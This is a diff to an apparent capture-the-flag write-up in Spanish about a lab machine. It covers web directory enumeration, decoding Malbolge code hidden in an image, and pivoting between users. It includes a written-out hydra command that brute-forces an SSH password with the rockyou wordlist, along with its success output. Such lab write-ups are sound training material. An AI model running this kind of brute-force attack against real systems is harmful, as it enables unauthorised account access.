@@ -31,18 +31,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 # Enumeracion de archivos y carpetas
 
-
+~~~
 [16:24:44] 200 -   10KB - /index.html
 [16:24:47] 403 -  276B  - /icons/      
 [16:25:10] 200 -   34KB - /cat.jpg              
 [16:25:16] 200 -  626B  - /manual/           
 [16:25:16] 301 -  311B  - /manual  ->  http://10.10.10.93/manual/
 [16:26:06] 200 -   13B  - /robots.txt  
+~~~
 
+En robots.txt nos pone que busquemos al usuario. --> find user :) .
 
-En robots.txt nos pone que busquemos al usuario. --> find user :)
-
-tenemos una imagen que contiene un codigo raro
+Tenemos una imagen que contiene un codigo raro con strings cat.jpg lo veremos.
 
 ```bash
 >C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW
@@ -50,14 +50,12 @@ VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
 KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
 ```
 
-se puede compilar en esta pagina , para dar con ella tela
+Se puede compilar en esta pagina , para dar con ella tela
 ~~~
 http://www.malbolge.doleczek.pl/
 ~~~
 
 conseguimos un nombre de usuario y con hydra conseguimos el password
-
-
 
 ❯ hydra -l xxxxxxx -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.93 -f -t 64
 Hydra v9.4-dev (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -71,7 +69,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-15 16:22:
 1 of 1 target successfully completed, 1 valid password found
 
 
-##User Pivoting
+## User Pivoting
 
 Del usuario xxxxxxx --> kings
 
